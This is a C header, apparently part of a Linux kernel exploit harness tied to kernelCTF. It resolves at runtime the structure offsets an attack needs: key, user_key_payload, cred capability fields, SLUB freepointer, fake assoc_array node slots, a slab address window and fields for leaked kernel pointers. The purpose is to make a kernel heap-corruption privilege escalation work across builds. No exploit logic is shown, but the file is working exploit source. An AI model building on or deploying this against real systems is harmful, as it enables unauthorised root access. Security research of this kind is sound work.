#ifndef K2_LAYOUT_HARDENED_H
#define K2_LAYOUT_HARDENED_H

#include <stdbool.h>
#include <stdint.h>

/*
 * Layout header.  The upstream harness pinned every offset to one kernelCTF
 * image; here every structure offset, the SLUB freepointer position, the fake
 * node-slot indices and the slab address window are resolved at runtime
 * (src/layout.c, BTF from /sys/kernel/btf/vmlinux) and exported through k2l.
 *
 * What stays compile time is only what is genuinely build independent on
 * x86_64 with 4K pages: the kmalloc-256 bucket geometry and the flag bits.
 */

#define H_USER_PAYLOAD_HEADER 24U
#define H_DIRECT_FAKE_BYTES 232U
#define H_USER_PAYLOAD_REQUEST (H_USER_PAYLOAD_HEADER + H_DIRECT_FAKE_BYTES)
#define H_USER_PAYLOAD_BUCKET 256U
#define H_USER_PAYLOAD_OBJECTS_PER_SLAB 16U
#define H_FILES_MAX 32U
#define H_PAYLOAD_DESC_MAX 32U

struct k2_layout {
    /* struct key */
    unsigned int key_usage;
    unsigned int key_serial;
    unsigned int key_user;
    unsigned int key_expiry;
    unsigned int key_last_used;
    unsigned int key_uid;
    unsigned int key_gid;
    unsigned int key_perm;
    unsigned int key_quotalen;
    unsigned int key_desc_len;
    unsigned int key_state;
    unsigned int key_flags;
    unsigned int key_hash;
    unsigned int key_x;
    unsigned int key_type;
    unsigned int key_domain;
    unsigned int key_description;
    unsigned int key_keys_root;
    unsigned int key_size;
    /* struct user_key_payload */
    unsigned int payload_header;
    /* struct cred */
    unsigned int cred_securebits;
    unsigned int cred_cap_permitted;
    unsigned int cred_cap_effective;
    /* struct key_user */
    unsigned int ku_lock;
    unsigned int ku_qnkeys;
    unsigned int ku_qnbytes;
    /* struct file (only used by the retired-filp cred oracle) */
    unsigned int file_size;
    unsigned int file_stride;
    unsigned int file_cred;
    unsigned int files_per_slab;
    /* struct assoc_array_node */
    unsigned int node_slots;
    /* discovered */
    unsigned int freeptr;
    unsigned int desc_off;
    unsigned int fake_slot;
    unsigned int payload_node_slot;
    unsigned int flag_in_quota;   /* KEY_FLAG_IN_QUOTA */
    unsigned int flag_user_alive; /* KEY_FLAG_USER_ALIVE */
    /* leaked kernel pointers */
    uint64_t key_type_user;
    uint64_t default_domain_tag;
    /* slab window, derived from the first captured page */
    uint64_t slab_lo;
    uint64_t slab_hi;
    /* provenance, for the report */
    char type_source[32];
    char layout_source[16];
};

extern struct k2_layout k2l;

int k2_layout_probe(void);
int k2_layout_finish(uint64_t page_base);
int k2_layout_selftest(void);
void k2_layout_report(void);

static inline bool k2_is_slab_pointer(uint64_t pointer)
{
    if ((pointer & 7) != 0 || pointer < UINT64_C(0xffff800000000000))
        return false;
    if (!k2l.slab_lo)
        return true;
    return pointer >= k2l.slab_lo && pointer < k2l.slab_hi;
}

#define H_KEY_USAGE (k2l.key_usage)
#define H_KEY_SERIAL (k2l.key_serial)
#define H_KEY_USER (k2l.key_user)
#define H_KEY_EXPIRY (k2l.key_expiry)
#define H_KEY_LAST_USED (k2l.key_last_used)
#define H_KEY_UID (k2l.key_uid)
#define H_KEY_GID (k2l.key_gid)
#define H_KEY_PERM (k2l.key_perm)
#define H_KEY_QUOTALEN (k2l.key_quotalen)
#define H_KEY_DESC_LEN (k2l.key_desc_len)
#define H_KEY_STATE (k2l.key_state)
#define H_KEY_FLAGS (k2l.key_flags)
#define H_KEY_HASH (k2l.key_hash)
#define H_KEY_X (k2l.key_x)
#define H_KEY_TYPE (k2l.key_type)
#define H_KEY_DOMAIN_TAG (k2l.key_domain)
#define H_KEY_DESCRIPTION (k2l.key_description)
#define H_KEY_KEYS_ROOT (k2l.key_keys_root)
#define H_KEY_SIZE (k2l.key_size)

#define H_KEY_USER_LOCK (k2l.ku_lock)
#define H_KEY_USER_QNKEYS (k2l.ku_qnkeys)
#define H_KEY_USER_QNBYTES (k2l.ku_qnbytes)

#define H_CRED_SECUREBITS (k2l.cred_securebits)
#define H_CRED_CAP_PERMITTED (k2l.cred_cap_permitted)
#define H_CRED_CAP_EFFECTIVE (k2l.cred_cap_effective)

#define H_FILE_SIZE (k2l.file_size)
#define H_FILE_STRIDE (k2l.file_stride)
#define H_FILE_CRED (k2l.file_cred)
#define H_FILES_PER_ORDER0_SLAB (k2l.files_per_slab)

#define H_USER_PAYLOAD_FREEPTR (k2l.freeptr)

#define H_KEY_FLAG_IN_QUOTA (k2l.flag_in_quota)
#define H_KEY_FLAG_USER_ALIVE (k2l.flag_user_alive)

/* Harness-wide direct-fake marker.  keyring_search_iterator() overwrites it. */
#define H_FAKE_MARKER_SENTINEL UINT64_C(0x6b326d61726b6572)

#define H_KEY_OTH_SEARCH 0x08
#define H_KEY_OTH_LINK 0x10

#endif
